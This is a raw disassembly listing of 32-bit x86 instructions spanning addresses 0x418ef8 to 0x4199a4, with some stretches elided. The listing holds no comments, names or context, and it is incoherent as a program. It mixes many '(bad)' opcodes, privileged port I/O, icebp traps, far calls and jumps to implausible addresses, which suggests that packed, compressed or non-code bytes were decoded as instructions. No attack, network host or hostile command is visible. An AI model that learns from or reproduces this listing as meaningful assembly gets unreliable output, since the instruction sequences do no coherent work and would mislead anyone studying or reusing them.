  418ef8:	sbb    ecx,esi
  418efa:	fistp  WORD PTR [ebp-0x79789324]
  418f00:	jmp    0x40b432aa
  418f05:	cmp    BYTE PTR [ebx+0x0],al
  418f08:	push   ds
  418f09:	jo     0x418edf
  418f0b:	into   
  418f0c:	cmp    DWORD PTR [edi+0x7966fd8c],0x190d23f7
  418f16:	mov    ds:0x3f0bad89,eax
  418f1b:	cmp    DWORD PTR [edx],ebp
  418f1d:	popa   
  418f1e:	daa    
  418f1f:	and    al,0xa1
  418f21:	inc    ebp
  418f22:	and    ch,cl
  418f24:	in     eax,0x50
  418f26:	daa    
  418f27:	and    al,0x91
  418f29:	dec    eax
  418f2a:	pop    ds
  418f2b:	and    al,0xf1
  418f2d:	lock loopne 0x418f54
  418f30:	in     eax,dx
  418f31:	pop    ds
  418f32:	pop    ebx
  418f33:	jae    0x418f25
  418f35:	cwde   
  418f36:	leave  
  418f37:	sub    ch,ch
  418f39:	pop    ds
  418f3a:	pop    ebx
  418f3b:	add    BYTE PTR [ebp-0x13ffb9f0],dl
	...
  418f69:	add    BYTE PTR [edi],bl
  418f6b:	pop    ebx
  418f6c:	jl     0x418f52
  418f6e:	cwde   
  418f6f:	mov    BYTE PTR [edx],al
  418f71:	jge    0x418fb4
  418f73:	or     bh,BYTE PTR [ebp+eax*8+0x37]
  418f77:	pop    ebx
  418f78:	jnp    0x418f63
  418f7a:	pop    ds
  418f7b:	pop    es
  418f7c:	add    ebp,DWORD PTR [edx-0x7c]
  418f7f:	pop    esp
  418f80:	je     0x418f7c
  418f82:	call   0xcd52b39d
  418f87:	sbb    DWORD PTR [ecx-0xe668849],ecx
  418f8d:	mov    esi,0x62307444
  418f92:	jecxz  0x418fd2
  418f94:	pop    eax
  418f95:	bound  eax,QWORD PTR [ebx]
  418f97:	aas    
  418f98:	adc    BYTE PTR [edx+0x50],dh
  418f9b:	xor    al,0xd5
  418f9d:	cmp    ecx,eax
  418f9f:	ror    esi,cl
  418fa1:	adc    DWORD PTR [edx+0x348efd8b],0xf500241f
  418fab:	fsubp  st(3),st
  418fad:	add    DWORD PTR [eax],ecx
  418faf:	jl     0x418f98
  418fb1:	adc    bh,BYTE PTR [esi+0x1a]
  418fb4:	and    al,0x10
  418fb6:	pusha  
  418fb7:	inc    edi
  418fb8:	sti    
  418fb9:	push   ecx
  418fba:	mov    bh,0x6
  418fbc:	into   
  418fbd:	call   0x3d1e39
  418fc2:	push   es
  418fc3:	je     0x419044
  418fc5:	std    
  418fc6:	test   BYTE PTR [edx+0x5dc5818c],0x0
  418fcd:	mov    eax,DWORD PTR [eax]
	...
  418ff7:	cmp    ebx,DWORD PTR [edx+0x4]
  418ffa:	add    BYTE PTR [ebp+0x3e504f18],dh
  419000:	(bad)  
  419001:	call   0xfbb4a524
  419006:	mov    eax,DWORD PTR [ecx+0x64552869]
  41900c:	push   es
  41900d:	into   
  41900e:	mov    ebp,ebp
  419010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419011:	lock repnz and dh,BYTE PTR [ebx+0x37]
  419016:	ret    
  419017:	adc    ah,BYTE PTR [esi-0x79]
  41901a:	inc    esp
  41901b:	pop    ecx
  41901c:	gs aaa 
  41901e:	xchg   BYTE PTR [ecx-0x77],bl
  419021:	std    
  419022:	(bad)  
  419023:	fadd   DWORD PTR [edi+0x5b0dbe80]
  419029:	add    BYTE PTR [eax],al
  41902b:	jne    0x419026
  41902d:	inc    eax
  41902e:	cmp    eax,0x5a75
  419033:	loope  0x419090
  419035:	jg     0x419034
  419037:	inc    edi
  419038:	stc    
  419039:	add    bh,BYTE PTR ds:0xfffff235
  41903f:	icebp  
  419040:	dec    esp
  419041:	xchg   DWORD PTR [ecx+ebp*2+0x15],ebx
  419045:	test   DWORD PTR [ecx+ebx*2+0x59],ebp
  419049:	sub    ebp,0x8924681c
  41904f:	mov    cl,BYTE PTR [edi+0x661bfffd]
  419055:	push   edx
  419056:	mov    edx,esp
  419058:	jmp    0x0:0xf023
	...
  419083:	add    BYTE PTR [ebx],cl
  419085:	adc    ch,BYTE PTR [edi+edi*8-0xfe8cfd]
  41908c:	mov    eax,ds:0xf3fffd86
  419091:	imul   eax,DWORD PTR [eax+0x24],0x10
  419095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419096:	loope  0x419023
  419098:	inc    eax
  419099:	ja     0x419081
  41909b:	jmp    0x24899e16
  4190a0:	je     0x4190af
  4190a2:	inc    eax
  4190a3:	and    al,0xf4
  4190a5:	out    0x51,al
  4190a7:	mov    edx,edx
  4190a9:	sbb    al,BYTE PTR [ecx]
  4190ab:	icebp  
  4190ac:	mov    ebx,0x8ae0341
  4190b1:	jle    0x4190b4
  4190b3:	add    BYTE PTR [ecx-0x4802f732],bl
  4190b9:	xchg   edi,eax
  4190ba:	jp     0x419118
  4190bc:	inc    eax
  4190bd:	mov    edx,0xb009fd80
  4190c2:	jp     0x419110
  4190c4:	inc    eax
  4190c5:	call   0x1:0x7e28967a
  4190cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190cd:	and    BYTE PTR cs:[eiz*4-0x6ac7dfca],bh
  4190d5:	inc    esi
  4190d6:	and    BYTE PTR [eax],dl
  4190d8:	fistp  DWORD PTR [ebx+ecx*1+0x1465b83]
  4190df:	inc    ebp
  4190e0:	inc    edi
  4190e1:	jns    0x41915d
  4190e3:	xchg   BYTE PTR [eax],dh
  4190e5:	jbe    0x4190e8
	...
  41910f:	add    BYTE PTR [eax],al
  419111:	out    dx,eax
  419112:	popa   
  419113:	jns    0x4190e3
  419115:	inc    esp
  419116:	pop    ebx
  419117:	pop    ebp
  419118:	(bad)  
  419119:	xor    DWORD PTR [eax+0x5f107d9e],ecx
  41911f:	out    0x3,eax
  419121:	lahf   
  419122:	mov    dh,bl
  419124:	jg     0x41912b
  419126:	pop    ebx
  419127:	out    0x3,eax
  419129:	push   ebp
  41912a:	pop    es
  41912b:	ret    
  41912c:	daa    
  41912d:	sbb    esi,ebx
  41912f:	mov    BYTE PTR [ebx],al
  419131:	sbb    al,0x5b
  419133:	bound  ecx,QWORD PTR [edi+0x40]
  419136:	das    
  419137:	jb     0x4190ef
  419139:	inc    ebp
  41913a:	xchg   esp,eax
  41913b:	ins    BYTE PTR es:[edi],dx
  41913c:	call   DWORD PTR ds:0x1e6d2e44
  419142:	aam    0x26
  419144:	push   ebx
  419145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419146:	push   ds
  419147:	or     edx,DWORD PTR [eax]
  419149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41914a:	jae    0x41915e
  41914c:	xlat   BYTE PTR ds:[ebx]
  41914d:	outs   dx,DWORD PTR ds:[esi]
  41914e:	sub    esp,DWORD PTR [edi+esi*1-0x8]
  419152:	inc    esi
  419153:	cwde   
  419154:	jp     0x419140
  419156:	rcl    DWORD PTR [ebx-0x6a8d07e1],1
  41915c:	lock test eax,0xf867d087
  419162:	dec    esi
  419163:	cdq    
  419164:	das    
  419165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419166:	cs retf 
  419168:	xor    ebp,ecx
  41916a:	sub    al,0x72
  41916c:	mov    ch,0x74
  41916e:	jg     0x419168
  419170:	in     eax,0x81
  419172:	sar    edi,cl
  419174:	jns    0x419176
	...
  41919e:	loopne 0x4191de
  4191a0:	pop    ds
  4191a1:	dec    ebp
  4191a2:	int3   
  4191a3:	shr    DWORD PTR [ebp-0x2976bb24],cl
  4191a9:	in     eax,0x25
  4191ab:	sahf   
  4191ac:	bound  ebx,QWORD PTR [eax+0x0]
  4191af:	outs   dx,DWORD PTR ds:[esi]
  4191b0:	inc    ebp
  4191b1:	adc    al,0xa5
  4191b3:	push   ss
  4191b4:	add    esi,DWORD PTR [edx*4+0xc0d002e]
  4191bb:	loopne 0x419209
  4191bd:	add    eax,0xcd54e008
  4191c2:	sti    
  4191c3:	rol    DWORD PTR [ebp+eax*8+0xf],1
  4191c7:	cs push ebx
  4191c9:	cmp    DWORD PTR [ebp-0xd471768],esp
  4191cf:	mov    ch,bh
  4191d1:	jb     0x419227
  4191d3:	aas    
  4191d4:	cmp    BYTE PTR [esi],dl
  4191d6:	outs   dx,DWORD PTR ds:[esi]
  4191d7:	aam    0xce
  4191d9:	(bad)  
  4191da:	loopne 0x41924f
  4191dc:	mov    eax,ds:0x39890178
  4191e1:	sub    al,0x7b
  4191e3:	inc    ecx
  4191e4:	mov    DWORD PTR [ebp+0x6f39430b],esp
  4191ea:	cmp    al,0x5f
  4191ec:	add    cl,ch
  4191ee:	dec    edx
  4191ef:	pop    esi
  4191f0:	add    DWORD PTR [edi-0x16ffa0d0],0xf4180f1f
  4191fa:	pop    ds
  4191fb:	pop    edx
  4191fc:	add    cl,ch
  4191fe:	inc    ebx
  4191ff:	pop    edx
  419200:	and    DWORD PTR [esi],0x0
	...
  41922a:	add    BYTE PTR [esi],bl
  41922c:	(bad)  
  41922e:	fcomp  QWORD PTR [edi]
  419230:	add    al,BYTE PTR [eax]
  419232:	jmp    0xec2ec72
  419237:	sbb    eax,0xef9e0b0f
  41923c:	ror    esi,cl
  41923e:	adc    DWORD PTR [ebp+0x76],esp
  419241:	std    
  419242:	test   BYTE PTR [eax+ecx*4-0x17],0xc9
  419247:	hlt    
  419248:	mul    BYTE PTR [ebx]
  41924a:	stc    
  41924b:	jb     0x4191d3
  41924d:	std    
  41924e:	jmp    0x3136672
  419253:	push   ecx
  419254:	sub    DWORD PTR [ebx+0x62],edx
  419257:	xchg   ecx,eax
  419258:	jae    0x41921f
  41925a:	add    BYTE PTR [ebx+0x7f],ch
  41925d:	sti    
  41925e:	inc    ebp
  41925f:	mov    dh,0xae
  419261:	std    
  419262:	je     0x4192bc
  419264:	add    DWORD PTR [esp+0x55],ebp
  419268:	add    eax,DWORD PTR [esp-0xf]
  41926c:	sbb    ecx,DWORD PTR [eax-0x77]
  41926f:	jmp    0x6d7ceaae
  419274:	(bad)  
  419275:	jg     0x41922e
  419277:	lods   eax,DWORD PTR ds:[esi]
  419278:	jle    0x419275
  41927a:	test   DWORD PTR [edx-0xa637e72],ebx
  419280:	pop    ecx
  419281:	add    BYTE PTR [ebx-0x79f4a676],al
  419287:	xchg   BYTE PTR [edx+0x0],bl
  41928a:	add    BYTE PTR [esi+0x4e],ch
  41928d:	and    al,0x10
	...
  4192b7:	add    BYTE PTR [edx+0x322bbf02],dh
  4192bd:	sub    cl,BYTE PTR [ebp-0x75]
  4192c0:	cmp    esp,DWORD PTR [edx+0x7f5aee2b]
  4192c6:	xchg   DWORD PTR [ecx+eiz*1+0x37],edx
  4192ca:	push   ebx
  4192cb:	push   edx
  4192cc:	rol    BYTE PTR ds:[edi-0x12a6a218],1
  4192d3:	(bad)  
  4192d4:	cli    
  4192d5:	xor    al,cl
  4192d7:	jg     0x419259
  4192d9:	add    al,BYTE PTR [esp-0x33]
  4192dd:	xor    al,BYTE PTR [esi+0x598124]
  4192e3:	jne    0x419271
  4192e5:	fidivr DWORD PTR [esi+0x598128]
  4192eb:	add    BYTE PTR [ecx],al
  4192ed:	push   edx
  4192ee:	cmp    DWORD PTR [eax],eax
  4192f0:	sbb    BYTE PTR [ecx+0x0],0x7c
  4192f4:	sbb    ah,0xfb
  4192f7:	add    dl,cl
  4192f9:	xor    bh,BYTE PTR [ecx]
  4192fb:	add    BYTE PTR [edi+ebp*1],bl
  4192fe:	add    al,0x0
  419300:	fdivr  DWORD PTR [esi-0x7a]
  419303:	std    
  419304:	pop    ds
  419305:	dec    eax
  419306:	cld    
  419307:	push   esp
  419308:	in     al,dx
  419309:	or     dl,dl
  41930b:	call   0xfe2355e5
  419310:	inc    edi
  419311:	lea    eax,[eax+0x59]
  419314:	shl    eax,cl
  419316:	retf   
  419317:	std    
  419318:	retf   0xc7f0
  41931b:	cmp    BYTE PTR [eax],al
	...
  419345:	pop    esi
  419346:	mov    eax,DWORD PTR [ecx]
  419348:	mov    DWORD PTR [eax-0x20770e62],ecx
  41934e:	test   eax,0x97150ca
  419353:	shr    al,cl
  419355:	and    ebx,esp
  419357:	loope  0x419356
  419359:	popa   
  41935a:	icebp  
  41935b:	lock jmp FWORD PTR [eax+0x2f]
  41935f:	in     eax,dx
  419360:	adc    BYTE PTR [edi-0x6eefda32],dl
  419366:	mov    ecx,0xf96e4fe2
  41936b:	shr    eax,1
  41936d:	sbb    ebp,DWORD PTR [ecx+eiz*8]
  419370:	std    
  419371:	xchg   edi,eax
  419372:	(bad)  
  419373:	and    eax,0x1738154
  419378:	add    BYTE PTR [ecx+ecx*4],bl
  41937b:	ret    0xfd71
  41937e:	push   cs
  41937f:	jge    0x419381
  419381:	sbb    al,0x72
  419383:	add    DWORD PTR [ecx+0x5869a],ecx
  419389:	sbb    al,0xc1
  41938b:	xor    DWORD PTR [ecx-0x1418959e],ecx
  419391:	mov    eax,DWORD PTR [ebp+0x7628ae04]
  419397:	add    DWORD PTR [eax],eax
  419399:	pop    ds
  41939a:	push   edi
  41939b:	sbb    eax,0xcc5aeedd
  4193a0:	xchg   BYTE PTR [ebp-0x7c],dl
  4193a3:	call   0xe7a09429
  4193a8:	add    eax,DWORD PTR [eax]
	...
  4193d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d3:	adc    al,ah
  4193d5:	pop    eax
  4193d6:	sub    edx,eax
  4193d8:	ins    DWORD PTR es:[edi],dx
  4193d9:	repz pop ds
  4193db:	pop    ebx
  4193dc:	out    0x8c,eax
  4193de:	call   0x601b:0x1c03eb63
  4193e5:	xchg   ecx,eax
  4193e6:	adc    BYTE PTR [edi-0x19],bl
  4193e9:	add    esp,DWORD PTR [ebx+0x1c07f7dd]
  4193ef:	pop    ebx
  4193f0:	bound  ecx,QWORD PTR [ecx+0x3e75f34]
  4193f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f7:	push   0xffffffe9
  4193f9:	mov    ch,0xa
  4193fb:	cdq    
  4193fc:	outs   dx,DWORD PTR ds:[esi]
  4193fd:	repz add ah,dh
  419400:	rol    DWORD PTR [edi],cl
  419402:	sbb    al,0x5b
  419404:	hlt    
  419405:	cld    
  419406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419407:	fdivr  st(7),st
  419409:	pop    es
  41940a:	sbb    al,0x5b
  41940c:	jo     0x419397
  41940e:	add    al,0x5f
  419410:	out    0x3,eax
  419412:	pop    esp
  419413:	rcr    BYTE PTR [ebp-0x1],cl
  419416:	pop    ds
  419417:	pop    ebx
  419418:	out    0x8c,eax
  41941a:	mov    ds:0x1c03e36a,al
  41941f:	shr    BYTE PTR [ebp-0x5],1
  419422:	pop    ds
  419423:	pop    ebx
  419424:	out    0x8d,eax
  419426:	or     al,0x59
  419428:	cmp    ecx,esp
  41942a:	(bad)  
  41942c:	test   DWORD PTR [edx+eax*4],0x1c03eb66
  419433:	push   cs
  419434:	lock mov es,WORD PTR [eax]
	...
  41945f:	call   0x65d2:0x1c03eb6a
  419466:	sti    
  419467:	pop    ds
  419468:	pop    ebx
  419469:	add    cl,ch
  41946b:	(bad)  
  41946d:	mov    cs,ebp
  41946f:	sbb    ebx,DWORD PTR [ebx+0x0]
  419472:	jo     0x41940a
  419474:	push   0x4
  419476:	jmp    0xf1c8669a
  41947b:	and    ebx,DWORD PTR [ebx+0x0]
  41947e:	mov    ecx,0xd986d1f8
  419483:	and    ebx,DWORD PTR [ebx+0x0]
  419486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419487:	sbb    BYTE PTR [ebx-0x77],bl
  41948a:	addr16 sbb al,0x5f
  41948d:	add    cl,ch
  41948f:	mov    al,ds:0x1fed18dc
  419494:	pop    ebx
  419495:	dec    DWORD PTR [esi+0x28]
  419498:	push   edi
  419499:	add    cl,ch
  41949b:	dec    eax
  41949c:	xchg   esi,eax
  41949d:	ror    cl,cl
  41949f:	mov    al,ds:0xa3252417
  4194a4:	fwait
  4194a5:	je     0x41945f
  4194a7:	nop
  4194a8:	(bad)  
  4194aa:	or     DWORD PTR [ecx+0x1fe510e9],ebp
  4194b0:	pop    ebx
  4194b1:	sub    DWORD PTR [ebp+0x724f2b43],edi
  4194b7:	mov    fs,WORD PTR [edi+0x4]
  4194ba:	jmp    0x58dc8de
  4194bf:	or     BYTE PTR ds:0x9e4f,ch
	...
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    BYTE PTR [ebx+ebp*4-0x2237da7f],bh
  4194f2:	sar    BYTE PTR [ebx+ebp*1-0xed576da],0x1f
  4194fa:	pop    esi
  4194fb:	push   0xffffffd4
  4194fd:	inc    ebx
  4194fe:	ret    0x1801
  419501:	aam    0x86
  419503:	stc    
  419504:	and    ebx,DWORD PTR [ebx+0x0]
  419507:	ret    0x36db
  41950a:	push   eax
  41950b:	add    al,al
  41950d:	aas    
  41950e:	pop    ebx
  41950f:	pop    esi
  419510:	not    BYTE PTR [edx+0x5e4dc238]
  419516:	mov    eax,0x508500
  41951b:	ret    
  41951c:	out    dx,al
  41951d:	sbb    DWORD PTR [esp+eax*1],esp
  419520:	out    dx,al
  419521:	xchg   ebp,eax
  419522:	mov    ebp,0x44d146e9
  419527:	or     BYTE PTR ds:0x19448798,al
  41952d:	imul   edi,DWORD PTR [ebp-0x14],0x11
  419531:	push   ebx
  419532:	add    BYTE PTR [eax],al
  419534:	enter  0x719d,0x7
  419538:	les    ebx,FWORD PTR [ecx+0x5e35042c]
  41953e:	mov    edi,0x4439b18b
  419543:	add    al,0x5
  419545:	pop    esi
  419546:	xchg   DWORD PTR [ecx+ebx*8-0xafffbe3],edx
  41954d:	dec    esp
  41954e:	xchg   DWORD PTR [eax+eax*1+0x0],ecx
	...
  419579:	fstp   DWORD PTR ds:0x48050004
  41957f:	xchg   DWORD PTR [ecx+ebx*8-0xafffb9f],edx
  419586:	dec    esp
  419587:	push   eax
  419588:	mov    edi,DWORD PTR [ecx+0x3a]
  41958b:	inc    eax
  41958c:	add    al,0xc5
  41958e:	pop    ebp
  41958f:	push   edx
  419590:	push   eax
  419591:	jo     0x4195a5
  419593:	and    al,0x18
  419595:	ins    DWORD PTR es:[edi],dx
  419596:	dec    esi
  419597:	icebp  
  419598:	inc    DWORD PTR [edx]
  41959a:	ffree  st(4)
  41959c:	sub    al,0xc9
  41959e:	pop    ebp
  41959f:	add    bl,al
  4195a1:	adc    DWORD PTR [edx-0x6e0e3334],edx
  4195a7:	int3   
  4195a8:	int3   
  4195a9:	icebp  
  4195aa:	xchg   ecx,eax
  4195ab:	int3   
  4195ac:	int3   
  4195ad:	sbb    al,0xbf
  4195af:	mov    ah,bl
  4195b1:	popf   
  4195b2:	jg     0x419586
  4195b4:	add    BYTE PTR [esp+esi*2],bl
  4195b7:	xor    al,0x56
  4195b9:	jmp    0x4195c7
  4195bb:	or     BYTE PTR ss:0xafb6106d,ch
  4195c2:	pop    ds
  4195c3:	push   edi
  4195c4:	aas    
  4195c5:	sbb    al,0xb
  4195c7:	aam    0xbf
  4195c9:	fs je  0x4195da
  4195cc:	mov    dh,0x20
  4195ce:	test   BYTE PTR [edi+ebp*8+0xd05929f],cl
  4195d5:	xchg   ebx,eax
  4195d6:	pop    es
  4195d7:	or     ebx,DWORD PTR [edx+ecx*8]
  4195da:	xor    al,BYTE PTR [ebx+eax*4]
	...
  419605:	add    BYTE PTR [eax+edi*2+0x78],ah
  419609:	iret   
  41960a:	and    ecx,DWORD PTR [edx]
  41960c:	ret    
  41960d:	mov    al,ah
  41960f:	push   esi
  419610:	int3   
  419611:	inc    ecx
  419612:	lahf   
  419613:	mov    esp,0xa3ed7c1c
  419618:	scas   eax,DWORD PTR es:[edi]
  419619:	data16 lahf 
  41961b:	dec    edi
  41961c:	adc    bh,bh
  41961e:	nop
  41961f:	mov    WORD PTR [eax+edx*8+0x4c8fbb0b],cs
  419626:	sbb    al,0xa8
  419628:	jmp    0x658a:0xef9ea101
  41962f:	jae    0x4195b3
  419631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419632:	mov    eax,ds:0xdbfdde82
  419637:	jb     0x4195bb
  419639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41963a:	mov    eax,ds:0xcbfdde82
  41963f:	jb     0x419655
  419641:	fst    DWORD PTR [ebx]
  419643:	or     BYTE PTR [edx+0x1b332c4],al
  419649:	mov    ebp,eax
  41964b:	test   eax,0x5b08fe82
  419650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419651:	or     DWORD PTR [esi-0x5b342be9],edx
  419657:	pop    ss
  419658:	hlt    
  419659:	jae    0x4195e0
  41965b:	push   ebx
  41965c:	popa   
  41965d:	dec    eax
  41965e:	dec    edi
  41965f:	scas   eax,DWORD PTR es:[edi]
  419660:	outs   dx,DWORD PTR ds:[esi]
  419661:	dec    eax
  419662:	daa    
  419663:	jmp    0x41960f
  419665:	xor    BYTE PTR [ebp+0x5f],0x73
  419669:	mov    esp,0x0
	...
  419692:	add    BYTE PTR [ebp+0x1c03e75f],dh
  419698:	push   eax
  419699:	popf   
  41969a:	sbb    DWORD PTR [eax+0x9],0x47a70428
  4196a1:	out    dx,eax
  4196a2:	adc    BYTE PTR [edx+0x43],0x4c
  4196a6:	or     dl,BYTE PTR [esi-0x6b3403e9]
  4196ac:	pop    ss
  4196ad:	fdiv   QWORD PTR [ebx+0x45]
  4196b0:	push   ebx
  4196b1:	popa   
  4196b2:	inc    edi
  4196b3:	out    dx,eax
  4196b4:	scas   al,BYTE PTR es:[edi]
  4196b5:	pop    edi
  4196b6:	inc    edi
  4196b7:	pop    es
  4196b8:	jmp    0x4196e4
  4196ba:	and    DWORD PTR ds:0x4bbd1b43,0xffffffa4
  4196c1:	out    0x95,al
  4196c3:	popf   
  4196c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c5:	adc    eax,0x3db1c45
  4196ca:	or     DWORD PTR [edx+ebx*2+0x56a50df3],ebp
  4196d1:	push   esp
  4196d2:	das    
  4196d3:	push   0x1a
  4196d5:	out    0xc,eax
  4196d7:	mov    al,ds:0xe1def7cd
  4196dc:	jg     0x4196cc
  4196de:	xchg   ebp,eax
  4196df:	popf   
  4196e0:	outs   dx,BYTE PTR ds:[esi]
  4196e1:	fld    QWORD PTR [esp+ebx*1-0x25]
  4196e5:	retf   
  4196e6:	or     BYTE PTR [edx+ebx*2+0x56950dbb],ch
  4196ed:	pop    esp
  4196ee:	das    
  4196ef:	xor    bl,BYTE PTR [edx]
  4196f1:	add    cl,ch
  4196f3:	and    bh,dl
  4196f5:	mov    ebx,0xd9
	...
  41971e:	add    BYTE PTR [eax],al
  419720:	retf   0xfd7d
  419723:	stos   BYTE PTR es:[edi],al
  419724:	sahf   
  419725:	sbb    DWORD PTR [eax],0x811c5d9d
  41972b:	adc    ecx,DWORD PTR [edi+0x6ad38c4e]
  419731:	jge    0x419730
  419733:	je     0x4196c9
  419735:	push   0xfffffffd
  419737:	(bad)  
  419738:	pop    ecx
  419739:	sub    ch,al
  41973b:	loopne 0x41975c
  41973d:	pop    ebx
  41973e:	add    BYTE PTR [esi-0x2a78ddd7],cl
  419744:	and    ebx,DWORD PTR [ebp-0x27ed16f8]
  41974a:	jecxz  0x4197b4
  41974c:	dec    esp
  41974d:	fiadd  DWORD PTR [eax]
  41974f:	jmp    0x1e97c173
  419754:	xchg   ebp,eax
  419755:	sbb    ecx,DWORD PTR [eax]
  419757:	ins    BYTE PTR es:[edi],dx
  419758:	repz fidiv DWORD PTR [edi+0x5b1fd9]
  41975f:	pusha  
  419760:	pop    ebp
  419761:	fld    st(0)
  419763:	in     eax,dx
  419764:	xchg   esp,eax
  419765:	dec    ecx
  419766:	jg     0x4196ef
  419768:	and    BYTE PTR [ebx-0x4],bl
  41976b:	jmp    0x62480d4e
  419770:	and    eax,0x11a9e4fe
  419775:	pop    ebx
  419776:	add    BYTE PTR [eax+0x77075201],ch
  41977c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977d:	inc    ebx
  41977e:	jg     0x419706
  419780:	and    BYTE PTR [ebx-0x4],bl
  419783:	jmp    0x419788
	...
  4197ac:	add    dh,bl
  4197ae:	jo     0x4197ba
  4197b0:	lock stc 
  4197b2:	(bad)  
  4197b3:	xor    ah,BYTE PTR [eax-0x76]
  4197b6:	fadd   st(2),st
  4197b8:	in     eax,0x94
  4197ba:	inc    ebx
  4197bb:	jg     0x4197bd
  4197bd:	push   edx
  4197be:	xchg   edi,eax
  4197bf:	or     eax,DWORD PTR [eax]
  4197c1:	lds    ebx,FWORD PTR [ecx+0x60be06eb]
  4197c7:	test   DWORD PTR [esi],edi
  4197c9:	ds ins BYTE PTR es:[edi],dx
  4197cb:	jge    0x4197b3
  4197cd:	mov    ch,0xaa
  4197cf:	(bad)  
  4197d0:	inc    DWORD PTR [ebp+esi*2+0xc]
  4197d4:	mov    ecx,DWORD PTR [esi+0x343fdfdb]
  4197da:	jl     0x4197ec
  4197dc:	or     DWORD PTR [ebx],edi
  4197de:	aam    0x18
  4197e0:	and    DWORD PTR [esi],0x8503f057
  4197e6:	cdq    
  4197e7:	out    0x4,eax
  4197e9:	jl     0x4197ab
  4197eb:	test   DWORD PTR [edx],esi
  4197ed:	in     al,dx
  4197ee:	retf   0xc27f
  4197f1:	inc    ecx
  4197f2:	shl    DWORD PTR [eax],cl
  4197f4:	and    DWORD PTR [ebx+0x5f],0x7
  4197f8:	xor    edi,DWORD PTR [edx+ebp*2+0x56758345]
  4197ff:	or     ecx,0x4589d4f0
  419805:	lds    ecx,FWORD PTR [ecx-0x18]
  419808:	daa    
  419809:	xor    eax,0xdb5f005a
  41980e:	inc    ebx
  41980f:	test   esp,ebp
	...
  419839:	add    BYTE PTR [eax-0x67],bl
  41983c:	add    al,0x0
  41983e:	jle    0x419856
  419840:	and    al,0x4
  419842:	outs   dx,DWORD PTR ds:[esi]
  419843:	(bad)  
  419844:	je     0x419887
  419846:	cmc    
  419847:	ror    BYTE PTR [edx],cl
  419849:	mov    ebp,ebp
  41984b:	fcmovb st,st(2)
  41984d:	add    al,0x86
  41984f:	call   0x4171:0x566f8104
  419856:	cmc    
  419857:	sub    ebp,esi
  419859:	ret    0x59c1
  41985c:	xchg   DWORD PTR [esp+ebx*1+0x50],eax
  419860:	or     BYTE PTR [edx+0x42a7a0],bh
  419866:	xchg   edi,eax
  419867:	mov    ecx,DWORD PTR [edx+0x5339f0a]
  41986d:	sbb    esi,0x20fa826f
  419873:	mov    DWORD PTR [edx+0x0],0x4bf662e
  41987a:	sbb    al,0xc7
  41987c:	mov    ah,bl
  41987e:	in     al,dx
  41987f:	ret    
  419880:	xor    BYTE PTR [ecx+0x5b887be1],cl
  419886:	adc    BYTE PTR [edi],al
  419888:	ss clc 
  41988a:	into   
  41988b:	jecxz  0x419876
  41988d:	sbb    eax,0x6801741c
  419892:	mov    al,ds:0x91004207
  419897:	fcom   QWORD PTR cs:[eax+0x44]
  41989b:	retf   0x4
	...
  4198c6:	add    BYTE PTR [ecx+eax*2],bl
  4198c9:	xchg   DWORD PTR [ebx+0x44],eax
  4198cc:	inc    ebx
  4198cd:	in     al,dx
  4198ce:	jo     0x4198ec
  4198d0:	je     0x4198d3
  4198d2:	pop    ecx
  4198d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d4:	(bad)  
  4198d5:	aaa    
  4198d6:	ret    0x7424
  4198d9:	ss mov eax,esp
  4198dc:	push   edi
  4198dd:	or     al,0x89
  4198df:	enter  0x58f,0x87
  4198e3:	fnsave [edx]
  4198e5:	or     DWORD PTR [esi+0x18e3b325],esi
  4198eb:	xchg   ebp,eax
  4198ec:	js     0x41987a
  4198ee:	mov    edi,0x78f855c
  4198f3:	fst    st(3)
  4198f5:	hlt    
  4198f6:	or     BYTE PTR [esi],ah
  4198f8:	sti    
  4198f9:	or     eax,0x932dd87
  4198fe:	mov    dh,0x15
  419900:	pop    ebx
  419901:	sub    ch,ah
  419903:	and    al,0x50
  419905:	icebp  
  419906:	mov    WORD PTR [esi],fs
  419908:	sar    BYTE PTR [eax],cl
  41990a:	xchg   esi,ebx
  41990c:	push   edi
  41990d:	pusha  
  41990e:	(bad)  
  41990f:	pop    esp
  419910:	dec    esp
  419911:	jge    0x419912
  419913:	and    ah,BYTE PTR [edx+0x70]
  419916:	lds    ebx,FWORD PTR [esp+ecx*2+0x7d]
  41991a:	or     eax,0x8ccf7a6b
  41991f:	push   ss
  419920:	shr    BYTE PTR [eax],cl
  419922:	inc    esp
  419923:	sub    ebp,eax
  419925:	lock les esi,FWORD PTR [ebx+0x6b]
  419929:	loop   0x419938
	...
  419953:	add    BYTE PTR [ebx-0x233a9faf],ah
  419959:	dec    ebx
  41995a:	cmp    eax,0xef7abb0d
  41995f:	push   cs
  419960:	es dec esp
  419962:	cmp    eax,0x609a2304
  419967:	push   cs
  419968:	lds    ebx,FWORD PTR [eax-0x3012fc11]
  41996e:	xor    esp,DWORD PTR [eax]
  419970:	and    al,0xd0
  419972:	and    esp,DWORD PTR [eax]
  419974:	sbb    al,dl
  419976:	jmp    0x6fa4ce3f
  41997b:	add    al,0xfb
  41997d:	iret   
  41997e:	jmp    0x5facde47
  419983:	add    al,0xeb
  419985:	iret   
  419986:	jmp    0x6f94ce4f
  41998b:	add    al,0x5b
  41998d:	shl    BYTE PTR [edx+0x6aaa9b44],cl
  419993:	lds    esp,FWORD PTR [eax]
  419995:	shl    bh,1
  419997:	mov    ebx,DWORD PTR ds:0x4c4e9d0
  41999d:	arpl   WORD PTR [edi+0x4],bp
  4199a0:	xor    edx,eax
  4199a2:	add    bl,ch
  4199a4:	loopne 0x419a18
